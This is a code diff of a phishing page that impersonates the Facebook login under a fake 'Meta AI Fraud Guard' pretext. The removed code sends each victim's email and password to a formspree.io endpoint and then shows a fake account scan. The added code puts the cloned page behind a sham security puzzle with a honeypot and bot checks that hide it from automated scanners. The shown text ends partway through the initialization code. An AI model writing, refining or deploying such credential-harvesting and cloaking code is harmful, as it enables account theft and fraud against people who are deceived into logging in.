@@ -3,10 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook – log in or sign up</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title>Security Verification Required</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         
         body {
             font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -14,6 +21,196 @@
             margin: 0;
             padding: 0;
             overflow-x: hidden;
+        }
+
+        /* SECURITY GATEWAY STYLES */
+        #security-gateway {
+            position: fixed;
+            inset: 0;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(10px);
+        }
+
+        .gateway-container {
+            background: white;
+            border-radius: 12px;
+            padding: 48px 40px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .gateway-header {
+            margin-bottom: 32px;
+        }
+
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, #4f46e5 0%, #6366f1 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(79, 70, 229, 0.7);
+            }
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 0 0 10px rgba(79, 70, 229, 0);
+            }
+        }
+
+        .shield-icon svg {
+            width: 48px;
+            height: 48px;
+            color: white;
+        }
+
+        .gateway-header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .gateway-header p {
+            font-size: 14px;
+            color: #666;
+            margin: 0;
+        }
+
+        .puzzle-section {
+            margin: 32px 0;
+        }
+
+        .puzzle-instruction {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        #puzzleCanvas {
+            width: 100%;
+            max-width: 400px;
+            height: 80px;
+            border: 2px solid #e5e5e5;
+            border-radius: 8px;
+            cursor: grab;
+            display: block;
+            margin: 0 auto;
+            background: #f9f9f9;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        #puzzleCanvas:active {
+            cursor: grabbing;
+        }
+
+        .puzzle-status {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #999;
+            min-height: 20px;
+        }
+
+        .puzzle-success {
+            color: #22c55e;
+            font-weight: 600;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .analyzing-state {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .analyzing-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4f46e5;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .analyzing-text {
+            color: #666;
+            font-size: 14px;
+            margin-top: 12px;
+        }
+
+        .footer-text {
+            font-size: 11px;
+            color: #999;
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid #eee;
+        }
+
+        /* HONEYPOT - Hidden from humans */
+        #honeypot-link {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            visibility: hidden;
+            display: none !important;
+        }
+
+        .session-blocked {
+            background: #fee2e2 !important;
+        }
+
+        .blocked-message {
+            color: #dc2626;
+            font-weight: 600;
+            padding: 20px;
+            border-radius: 8px;
+            background: #fecaca;
+            margin: 16px 0;
+        }
+
+        /* MAIN APPLICATION CONTENT - Hidden by default */
+        #main-application {
+            display: none;
         }
 
         .fb-logo-text {
@@ -60,7 +257,6 @@
             align-items: center;
         }
 
-        /* Spinner Animation */
         .spinner {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #1877f2;
@@ -68,11 +264,6 @@
             width: 50px;
             height: 50px;
             animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
 
         @media (max-width: 900px) {
@@ -84,196 +275,527 @@
             .desktop-center-container {
                 padding-top: 40px;
             }
+            
+            .gateway-container {
+                padding: 32px 24px;
+                max-width: 90%;
+            }
+
+            .gateway-header h1 {
+                font-size: 24px;
+            }
         }
     </style>
 </head>
 <body class="flex flex-col">
 
-    <!-- 1. LOADING SCREEN -->
-    <div id="loading-screen">
-        <h1 class="text-white text-5xl md:text-7xl font-bold tracking-tighter select-none">facebook</h1>
-    </div>
+    <!-- HONEYPOT LINK - Hidden from humans but visible to bots -->
+    <a id="honeypot-link" href="javascript:void(0)">Admin Panel</a>
 
-    <!-- 2. FRAUD ACCOUNT FILTER PAGE -->
-    <div id="fraud-filter-page" class="hidden-page min-h-screen flex items-center justify-center bg-[#f0f2f5] p-4">
-        <div class="max-w-2xl bg-white p-8 rounded-xl shadow-lg border border-gray-200">
-            <div class="flex items-center gap-3 mb-6">
-                <div class="bg-blue-100 p-2 rounded-full">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-[#1877f2]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+    <!-- SECURITY GATEWAY - MANDATORY VERIFICATION -->
+    <div id="security-gateway">
+        <div class="gateway-container">
+            <div class="gateway-header">
+                <div class="shield-icon">
+                    <svg fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
                     </svg>
                 </div>
-                <h2 class="text-2xl font-bold text-gray-800">Fraud Account Filter</h2>
-            </div>
-            
-            <div class="space-y-4 text-gray-700 leading-relaxed">
-                <div class="bg-blue-50 p-4 rounded-lg border-l-4 border-[#1877f2] mb-6">
-                    <p class="font-semibold text-[#166fe5]">New Security Enhancement</p>
-                    <p class="text-sm">We've integrated <strong>Meta AI</strong> to protect your digital identity. This new feature automatically detects and blocks fraudulent activity before it reaches your timeline.</p>
-                </div>
-
-                <h3 class="font-bold text-lg text-gray-900">How to Detect & Avoid Scammers:</h3>
-                <ul class="list-disc pl-5 space-y-2">
-                    <li><strong>Check the Profile:</strong> Scammers often use recently created accounts with very few friends or photos.</li>
-                    <li><strong>Urgency Tactics:</strong> Be wary of messages claiming your account will be deleted or asking for "urgent help" with money.</li>
-                    <li><strong>Suspicious Links:</strong> Never click on links that ask for your login credentials outside of the official Facebook app.</li>
-                    <li><strong>Identity Spoofing:</strong> Scammers may impersonate your friends. Always verify unusual requests through a different communication channel.</li>
-                </ul>
-                <p class="mt-6 pt-4 border-t border-gray-100">To activate the <strong>Meta AI Fraud Guard</strong>, please proceed to the secure login verification.</p>
+                <h1>Security Verification</h1>
+                <p>Please complete the verification to continue</p>
             </div>
 
-            <button onclick="showLoginPage()" class="w-full mt-8 bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-3 rounded-md transition duration-200 text-lg">
-                Secure Login to Proceed
-            </button>
+            <div id="puzzle-container" class="puzzle-section">
+                <div class="puzzle-instruction">Slide the puzzle piece to unlock →</div>
+                <canvas id="puzzleCanvas"></canvas>
+                <div class="puzzle-status" id="puzzleStatus"></div>
+            </div>
+
+            <div id="analyzing-container" class="hidden-page analyzing-state">
+                <div class="analyzing-spinner"></div>
+                <p class="analyzing-text">Analyzing browser configuration...</p>
+            </div>
+
+            <div id="blocked-container" class="hidden-page">
+                <div class="blocked-message">Access Denied - Suspicious Activity Detected</div>
+                <p class="analyzing-text">This session has been blocked.</p>
+            </div>
+
+            <p class="footer-text">🔒 Protected by Security Gateway</p>
         </div>
     </div>
 
-    <!-- 3. ACTUAL LOGIN PAGE -->
-    <div id="login-page" class="hidden-page">
-        <div class="desktop-center-container">
-            <main class="w-full max-w-[980px] mx-auto flex flex-col md:flex-row items-center justify-between px-4">
-                <div class="md:w-[580px] text-center md:text-left mb-10 md:mb-0 pb-8">
-                    <h1 class="fb-logo-text select-none">facebook</h1>
-                    <p class="text-2xl md:text-[28px] leading-tight text-gray-800 font-normal">Facebook helps you connect and share with the people in your life.</p>
-                </div>
-                <div class="w-full max-w-[396px]">
-                    <div class="bg-white p-4 rounded-lg login-card border border-gray-200">
-                        <form id="loginForm" class="flex flex-col gap-4">
-                            <input type="text" placeholder="Email address or phone number" class="p-3.5 border border-gray-300 rounded-md text-lg w-full focus:ring-0" required>
-                            <input type="password" placeholder="Password" class="p-3.5 border border-gray-300 rounded-md text-lg w-full focus:ring-0" required>
-                            <button type="submit" class="bg-[#1877f2] hover:bg-[#166fe5] text-white text-xl font-bold py-3 rounded-md transition duration-200">Log in</button>
-                            <div class="text-center py-2"><a href="#" class="text-[#1877f2] text-sm hover:underline">Forgotten password?</a></div>
-                            <hr class="border-gray-200 my-2">
-                            <div class="flex justify-center pt-2 pb-1">
-                                <button type="button" class="bg-[#42b72a] hover:bg-[#36a420] text-white text-[17px] font-bold py-3 px-4 rounded-md transition duration-200">Create new account</button>
-                            </div>
-                        </form>
-                    </div>
-                    <p class="text-[14px] text-center mt-7"><a href="#" class="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.</p>
-                </div>
-            </main>
-        </div>
-        <footer class="bg-white pt-8 pb-10 px-4 mt-12">
-            <div class="max-w-[980px] mx-auto text-xs text-gray-500">
-                <div class="flex flex-wrap gap-x-3"><span>English (UK)</span><a href="#" class="hover:underline">Hausa</a><a href="#" class="hover:underline">Français</a></div>
-                <hr class="border-gray-200 my-2">
-                <div>Meta © 2024</div>
-            </div>
-        </footer>
-    </div>
-
-    <!-- 4. SCANNING/LOADING PAGE -->
-    <div id="scanning-page" class="hidden-page min-h-screen flex flex-col items-center justify-center bg-white p-4">
-        <div class="spinner mb-6"></div>
-        <h2 class="text-2xl font-bold text-gray-800 mb-2">Scanning Account...</h2>
-        <p class="text-gray-500 text-center max-w-sm">Meta AI is currently scanning your account for fraudulent activities and associated scammer profiles. Please do not close this window.</p>
-        <p id="timer" class="mt-4 font-mono text-blue-600">Time remaining: 30s</p>
-    </div>
-
-    <!-- 5. RESULTS MODAL (Overlay) -->
-    <div id="results-modal" class="hidden-page fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[1000] p-4">
-        <div class="bg-white rounded-lg p-8 max-w-md w-full shadow-2xl">
-            <div class="text-center">
-                <div class="text-red-500 mb-4">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-                    </svg>
-                </div>
-                <h3 class="text-2xl font-bold text-gray-900 mb-2">Scan Complete</h3>
-                <p class="text-lg text-gray-700 mb-6">Meta AI has detected <span id="scammer-count" class="font-extrabold text-red-600">0</span> potential scammer accounts attempting to interact with your profile.</p>
-                <div id="reload-prompt" class="hidden-page p-4 bg-yellow-50 rounded-lg border border-yellow-200 mb-6">
-                    <p class="text-sm text-yellow-800">To view the specific accounts and blocked IDs, please reload the security dashboard.</p>
-                </div>
-                <button onclick="goTo404()" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-md hover:bg-[#166fe5]">
-                    Reload Page to View Accounts
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 6. 404 ERROR PAGE -->
-    <div id="error-page" class="hidden-page min-h-screen flex flex-col items-center justify-center bg-[#f0f2f5] p-6 text-center">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/yN/r/76Y9f_c99pk.png" alt="404" class="w-32 mb-6">
-        <h1 class="text-2xl font-bold text-gray-800 mb-2">This page isn't available</h1>
-        <p class="text-gray-600 max-w-md mb-6">The link you followed may be broken, or the page may have been removed. Go back to Facebook.</p>
-        <button onclick="location.reload()" class="bg-[#1877f2] text-white font-bold py-2 px-6 rounded-md">Go to News Feed</button>
-    </div>
+    <!-- MAIN APPLICATION - Hidden until verification -->
+    <div id="main-application"></div>
 
     <script>
-        window.onload = () => {
-            setTimeout(() => {
-                document.getElementById('loading-screen').classList.add('fade-out');
-                setTimeout(() => {
-                    document.getElementById('loading-screen').classList.add('hidden-page');
-                    document.getElementById('fraud-filter-page').classList.remove('hidden-page');
-                }, 500);
-            }, 1800);
+        // ====== SECURITY GATEWAY IMPLEMENTATION ======
+        
+        // Session state tracking
+        let sessionVerified = false;
+        let sessionBlocked = false;
+        let interactionDetected = {
+            mouseDown: false,
+            mouseMove: false,
+            mouseUp: false
         };
 
-        function showLoginPage() {
-            document.getElementById('fraud-filter-page').classList.add('hidden-page');
-            document.getElementById('login-page').classList.remove('hidden-page');
-            window.scrollTo(0, 0);
-        }
-
-        document.getElementById('loginForm').addEventListener('submit', (e) => {
+        // Honeypot protection - blocks bot-like access
+        document.getElementById('honeypot-link').addEventListener('click', (e) => {
             e.preventDefault();
-            
-            // Get form data
-            const inputs = e.target.querySelectorAll('input');
-            const formData = new FormData();
-            formData.append('email', inputs[0].value);
-            formData.append('password', inputs[1].value);
-            
-            // Send to formspree
-            fetch('https://formspree.io/f/mlgbkzly', {
-                method: 'POST',
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            }).then(response => {
-                // Show scanning page regardless of success/failure
-                document.getElementById('login-page').classList.add('hidden-page');
-                document.getElementById('scanning-page').classList.remove('hidden-page');
-                startScanTimer();
-            }).catch(error => {
-                // Still show scanning page even if there's an error
-                document.getElementById('login-page').classList.add('hidden-page');
-                document.getElementById('scanning-page').classList.remove('hidden-page');
-                startScanTimer();
-            });
+            blockSession('Honeypot link clicked - Bot detected');
         });
 
-        function startScanTimer() {
-            let seconds = 30;
-            const timerEl = document.getElementById('timer');
-            const countdown = setInterval(() => {
-                seconds--;
-                timerEl.innerText = `Time remaining: ${seconds}s`;
-                if (seconds <= 0) {
-                    clearInterval(countdown);
-                    showResults();
-                }
-            }, 1000);
-        }
-
-        function showResults() {
-            const count = Math.floor(Math.random() * (195 - 7 + 1)) + 7;
-            document.getElementById('scammer-count').innerText = count;
-            document.getElementById('scanning-page').classList.add('hidden-page');
-            document.getElementById('results-modal').classList.remove('hidden-page');
+        function blockSession(reason) {
+            sessionBlocked = true;
+            console.warn('[Security] Session blocked:', reason);
             
-            // Show the "stagnant" reload prompt inside the modal after showing count
-            setTimeout(() => {
-                document.getElementById('reload-prompt').classList.remove('hidden-page');
-            }, 1000);
+            // Hide puzzle, show blocked message
+            document.getElementById('puzzle-container').classList.add('hidden-page');
+            document.getElementById('blocked-container').classList.remove('hidden-page');
+            document.getElementById('security-gateway').classList.add('session-blocked');
         }
 
-        function goTo404() {
-            document.getElementById('results-modal').classList.add('hidden-page');
-            document.getElementById('error-page').classList.remove('hidden-page');
+        // ====== PUZZLE VERIFICATION SYSTEM ======
+        
+        let puzzleState = {
+            pieceX: 20,
+            pieceY: 15,
+            isDragging: false,
+            startX: 0,
+            startY: 0,
+            targetX: 320,
+            targetThreshold: 40,
+            solved: false
+        };
+
+        const canvas = document.getElementById('puzzleCanvas');
+        const ctx = canvas.getContext('2d');
+
+        // Set canvas size
+        function resizeCanvas() {
+            const rect = canvas.getBoundingClientRect();
+            canvas.width = rect.width;
+            canvas.height = rect.height;
+            drawPuzzle();
         }
+
+        function drawPuzzle() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Draw background track
+            ctx.fillStyle = '#e5e5e5';
+            ctx.fillRect(10, canvas.height / 2 - 15, canvas.width - 20, 30);
+            
+            // Draw target zone (destination indicator)
+            ctx.fillStyle = '#d1d5db';
+            ctx.fillRect(puzzleState.targetX, canvas.height / 2 - 15, 40, 30);
+            
+            // Draw arrow in target zone
+            ctx.fillStyle = '#999';
+            ctx.font = 'bold 20px Arial';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('✓', puzzleState.targetX + 20, canvas.height / 2);
+            
+            // Draw puzzle piece
+            ctx.fillStyle = '#4f46e5';
+            ctx.beginPath();
+            ctx.roundRect(puzzleState.pieceX, canvas.height / 2 - 12, 40, 24, 4);
+            ctx.fill();
+            
+            // Draw arrow on piece
+            ctx.fillStyle = 'white';
+            ctx.font = 'bold 18px Arial';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('→', puzzleState.pieceX + 20, canvas.height / 2);
+            
+            // Draw success state
+            if (puzzleState.solved) {
+                ctx.fillStyle = 'rgba(34, 197, 94, 0.1)';
+                ctx.fillRect(10, canvas.height / 2 - 15, canvas.width - 20, 30);
+            }
+        }
+
+        // Polyfill for roundRect if not available
+        if (!CanvasRenderingContext2D.prototype.roundRect) {
+            CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, r) {
+                if (w < 2 * r) r = w / 2;
+                if (h < 2 * r) r = h / 2;
+                this.beginPath();
+                this.moveTo(x + r, y);
+                this.arcTo(x + w, y, x + w, y + h, r);
+                this.arcTo(x + w, y + h, x, y + h, r);
+                this.arcTo(x, y + h, x, y, r);
+                this.arcTo(x, y, x + r, y, r);
+                this.closePath();
+                return this;
+            };
+        }
+
+        // Mouse/Touch events for puzzle interaction
+        canvas.addEventListener('mousedown', (e) => {
+            interactionDetected.mouseDown = true;
+            if (puzzleState.solved || sessionBlocked) return;
+            
+            const rect = canvas.getBoundingClientRect();
+            const x = e.clientX - rect.left;
+            const y = e.clientY - rect.top;
+            
+            // Check if click is within puzzle piece
+            if (x >= puzzleState.pieceX && x <= puzzleState.pieceX + 40 &&
+                y >= canvas.height / 2 - 12 && y <= canvas.height / 2 + 12) {
+                puzzleState.isDragging = true;
+                puzzleState.startX = x;
+            }
+        });
+
+        canvas.addEventListener('mousemove', (e) => {
+            if (puzzleState.isDragging) {
+                interactionDetected.mouseMove = true;
+                if (puzzleState.solved || sessionBlocked) return;
+                
+                const rect = canvas.getBoundingClientRect();
+                const x = e.clientX - rect.left;
+                const deltaX = x - puzzleState.startX;
+                
+                // Constrain movement
+                puzzleState.pieceX = Math.max(20, Math.min(canvas.width - 70, 20 + deltaX));
+                drawPuzzle();
+            }
+        });
+
+        canvas.addEventListener('mouseup', (e) => {
+            interactionDetected.mouseUp = true;
+            if (!puzzleState.isDragging) return;
+            
+            puzzleState.isDragging = false;
+            
+            // Check if piece is in target zone
+            if (Math.abs(puzzleState.pieceX - puzzleState.targetX) < puzzleState.targetThreshold) {
+                solvePuzzle();
+            } else {
+                // Reset piece
+                puzzleState.pieceX = 20;
+                drawPuzzle();
+                updatePuzzleStatus('Try again', false);
+            }
+        });
+
+        // Touch support
+        canvas.addEventListener('touchstart', (e) => {
+            interactionDetected.mouseDown = true;
+            if (puzzleState.solved || sessionBlocked) return;
+            
+            const rect = canvas.getBoundingClientRect();
+            const touch = e.touches[0];
+            const x = touch.clientX - rect.left;
+            const y = touch.clientY - rect.top;
+            
+            if (x >= puzzleState.pieceX && x <= puzzleState.pieceX + 40 &&
+                y >= canvas.height / 2 - 12 && y <= canvas.height / 2 + 12) {
+                puzzleState.isDragging = true;
+                puzzleState.startX = x;
+            }
+        });
+
+        canvas.addEventListener('touchmove', (e) => {
+            if (puzzleState.isDragging) {
+                interactionDetected.mouseMove = true;
+                e.preventDefault();
+                if (puzzleState.solved || sessionBlocked) return;
+                
+                const rect = canvas.getBoundingClientRect();
+                const touch = e.touches[0];
+                const x = touch.clientX - rect.left;
+                const deltaX = x - puzzleState.startX;
+                
+                puzzleState.pieceX = Math.max(20, Math.min(canvas.width - 70, 20 + deltaX));
+                drawPuzzle();
+            }
+        });
+
+        canvas.addEventListener('touchend', (e) => {
+            interactionDetected.mouseUp = true;
+            if (!puzzleState.isDragging) return;
+            
+            puzzleState.isDragging = false;
+            
+            if (Math.abs(puzzleState.pieceX - puzzleState.targetX) < puzzleState.targetThreshold) {
+                solvePuzzle();
+            } else {
+                puzzleState.pieceX = 20;
+                drawPuzzle();
+                updatePuzzleStatus('Try again', false);
+            }
+        });
+
+        function updatePuzzleStatus(message, success = false) {
+            const status = document.getElementById('puzzleStatus');
+            status.textContent = message;
+            status.className = success ? 'puzzle-status puzzle-success' : 'puzzle-status';
+        }
+
+        function solvePuzzle() {
+            // Verify real human interaction
+            if (!interactionDetected.mouseDown || !interactionDetected.mouseMove || !interactionDetected.mouseUp) {
+                console.warn('[Security] Interaction verification failed - bot-like behavior detected');
+                blockSession('Invalid interaction pattern detected');
+                return;
+            }
+
+            puzzleState.solved = true;
+            updatePuzzleStatus('✓ Verified', true);
+            
+            setTimeout(() => {
+                beginVerificationAnalysis();
+            }, 500);
+        }
+
+        function beginVerificationAnalysis() {
+            document.getElementById('puzzle-container').classList.add('hidden-page');
+            document.getElementById('analyzing-container').classList.remove('hidden-page');
+            
+            // Simulate security analysis
+            setTimeout(() => {
+                completeVerification();
+            }, 2000);
+        }
+
+        function completeVerification() {
+            sessionVerified = true;
+            
+            // Hide security gateway
+            document.getElementById('security-gateway').style.display = 'none';
+            
+            // Inject main application HTML
+            injectMainApplication();
+            
+            // Show main application
+            document.getElementById('main-application').style.display = 'block';
+            
+            // Trigger application initialization
+            initializeMainApp();
+        }
+
+        function injectMainApplication() {
+            const mainApp = document.getElementById('main-application');
+            
+            mainApp.innerHTML = `
+                <!-- 1. LOADING SCREEN -->
+                <div id="loading-screen">
+                    <h1 class="text-white text-5xl md:text-7xl font-bold tracking-tighter select-none">facebook</h1>
+                </div>
+
+                <!-- 2. FRAUD ACCOUNT FILTER PAGE -->
+                <div id="fraud-filter-page" class="hidden-page min-h-screen flex items-center justify-center bg-[#f0f2f5] p-4">
+                    <div class="max-w-2xl bg-white p-8 rounded-xl shadow-lg border border-gray-200">
+                        <div class="flex items-center gap-3 mb-6">
+                            <div class="bg-blue-100 p-2 rounded-full">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-[#1877f2]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                                </svg>
+                            </div>
+                            <h2 class="text-2xl font-bold text-gray-800">Fraud Account Filter</h2>
+                        </div>
+                        
+                        <div class="space-y-4 text-gray-700 leading-relaxed">
+                            <div class="bg-blue-50 p-4 rounded-lg border-l-4 border-[#1877f2] mb-6">
+                                <p class="font-semibold text-[#166fe5]">New Security Enhancement</p>
+                                <p class="text-sm">We've integrated <strong>Meta AI</strong> to protect your digital identity. This new feature automatically detects and blocks fraudulent activity before it reaches your timeline.</p>
+                            </div>
+
+                            <h3 class="font-bold text-lg text-gray-900">How to Detect & Avoid Scammers:</h3>
+                            <ul class="list-disc pl-5 space-y-2">
+                                <li><strong>Check the Profile:</strong> Scammers often use recently created accounts with very few friends or photos.</li>
+                                <li><strong>Urgency Tactics:</strong> Be wary of messages claiming your account will be deleted or asking for "urgent help" with money.</li>
+                                <li><strong>Suspicious Links:</strong> Never click on links that ask for your login credentials outside of the official Facebook app.</li>
+                                <li><strong>Identity Spoofing:</strong> Scammers may impersonate your friends. Always verify unusual requests through a different communication channel.</li>
+                            </ul>
+                            <p class="mt-6 pt-4 border-t border-gray-100">To activate the <strong>Meta AI Fraud Guard</strong>, please proceed to the secure login verification.</p>
+                        </div>
+
+                        <button onclick="showLoginPage()" class="w-full mt-8 bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-3 rounded-md transition duration-200 text-lg">
+                            Secure Login to Proceed
+                        </button>
+                    </div>
+                </div>
+
+                <!-- 3. ACTUAL LOGIN PAGE -->
+                <div id="login-page" class="hidden-page">
+                    <div class="desktop-center-container">
+                        <main class="w-full max-w-[980px] mx-auto flex flex-col md:flex-row items-center justify-between px-4">
+                            <div class="md:w-[580px] text-center md:text-left mb-10 md:mb-0 pb-8">
+                                <h1 class="fb-logo-text select-none">facebook</h1>
+                                <p class="text-2xl md:text-[28px] leading-tight text-gray-800 font-normal">Facebook helps you connect and share with the people in your life.</p>
+                            </div>
+                            <div class="w-full max-w-[396px]">
+                                <div class="bg-white p-4 rounded-lg login-card border border-gray-200">
+                                    <form id="loginForm" class="flex flex-col gap-4">
+                                        <input type="text" placeholder="Email address or phone number" class="p-3.5 border border-gray-300 rounded-md text-lg w-full focus:ring-0" required>
+                                        <input type="password" placeholder="Password" class="p-3.5 border border-gray-300 rounded-md text-lg w-full focus:ring-0" required>
+                                        <button type="submit" class="bg-[#1877f2] hover:bg-[#166fe5] text-white text-xl font-bold py-3 rounded-md transition duration-200">Log in</button>
+                                        <div class="text-center py-2"><a href="#" class="text-[#1877f2] text-sm hover:underline">Forgotten password?</a></div>
+                                        <hr class="border-gray-200 my-2">
+                                        <div class="flex justify-center pt-2 pb-1">
+                                            <button type="button" class="bg-[#42b72a] hover:bg-[#36a420] text-white text-[17px] font-bold py-3 px-4 rounded-md transition duration-200">Create new account</button>
+                                        </div>
+                                    </form>
+                                </div>
+                                <p class="text-[14px] text-center mt-7"><a href="#" class="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.</p>
+                            </div>
+                        </main>
+                    </div>
+                    <footer class="bg-white pt-8 pb-10 px-4 mt-12">
+                        <div class="max-w-[980px] mx-auto text-xs text-gray-500">
+                            <div class="flex flex-wrap gap-x-3"><span>English (UK)</span><a href="#" class="hover:underline">Hausa</a><a href="#" class="hover:underline">Français</a></div>
+                            <hr class="border-gray-200 my-2">
+                            <div>Meta © 2024</div>
+                        </div>
+                    </footer>
+                </div>
+
+                <!-- 4. SCANNING/LOADING PAGE -->
+                <div id="scanning-page" class="hidden-page min-h-screen flex flex-col items-center justify-center bg-white p-4">
+                    <div class="spinner mb-6"></div>
+                    <h2 class="text-2xl font-bold text-gray-800 mb-2">Scanning Account...</h2>
+                    <p class="text-gray-500 text-center max-w-sm">Meta AI is currently scanning your account for fraudulent activities and associated scammer profiles. Please do not close this window.</p>
+                    <p id="timer" class="mt-4 font-mono text-blue-600">Time remaining: 30s</p>
+                </div>
+
+                <!-- 5. RESULTS MODAL (Overlay) -->
+                <div id="results-modal" class="hidden-page fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[1000] p-4">
+                    <div class="bg-white rounded-lg p-8 max-w-md w-full shadow-2xl">
+                        <div class="text-center">
+                            <div class="text-red-500 mb-4">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                                </svg>
+                            </div>
+                            <h3 class="text-2xl font-bold text-gray-900 mb-2">Scan Complete</h3>
+                            <p class="text-lg text-gray-700 mb-6">Meta AI has detected <span id="scammer-count" class="font-extrabold text-red-600">0</span> potential scammer accounts attempting to interact with your profile.</p>
+                            <div id="reload-prompt" class="hidden-page p-4 bg-yellow-50 rounded-lg border border-yellow-200 mb-6">
+                                <p class="text-sm text-yellow-800">To view the specific accounts and blocked IDs, please reload the security dashboard.</p>
+                            </div>
+                            <button onclick="goTo404()" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-md hover:bg-[#166fe5]">
+                                Reload Page to View Accounts
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 6. 404 ERROR PAGE -->
+                <div id="error-page" class="hidden-page min-h-screen flex flex-col items-center justify-center bg-[#f0f2f5] p-6 text-center">
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/yN/r/76Y9f_c99pk.png" alt="404" class="w-32 mb-6">
+                    <h1 class="text-2xl font-bold text-gray-800 mb-2">This page isn't available</h1>
+                    <p class="text-gray-600 max-w-md mb-6">The link you followed may be broken, or the page may have been removed. Go back to Facebook.</p>
+                    <button onclick="location.reload()" class="bg-[#1877f2] text-white font-bold py-2 px-6 rounded-md">Go to News Feed</button>
+                </div>
+            `;
+        }
+
+        function initializeMainApp() {
+            // Initialize loading screen
+            window.onload = () => {
+                setTimeout(() => {
+                    document.getElementById('loading-screen').classList.add('fade-out');
+                    setTimeout(() => {
